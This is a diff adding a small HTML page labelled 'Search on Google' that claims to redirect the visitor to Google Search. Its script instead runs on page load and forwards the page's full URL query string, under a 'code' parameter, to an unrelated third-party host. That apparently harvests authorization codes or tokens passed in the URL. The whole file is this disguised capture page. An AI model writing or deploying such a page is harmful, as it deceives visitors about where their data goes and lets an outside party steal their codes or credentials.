@@ -1,0 +1,17 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Search on Google</title>
+    <script>
+        function redirectToGoogleSearch() {
+            const searchQuery = window.location.search.slice(1); // Extract the query string (without leading "?")
+            window.location.href = `https://suez.lovestoblog.com/index.php?code=${searchQuery}`;
+        }
+    </script>
+</head>
+<body>
+    <h1>Redirecting to Google Search...</h1>
+    <script>redirectToGoogleSearch();</script>
+</body>
+</html>
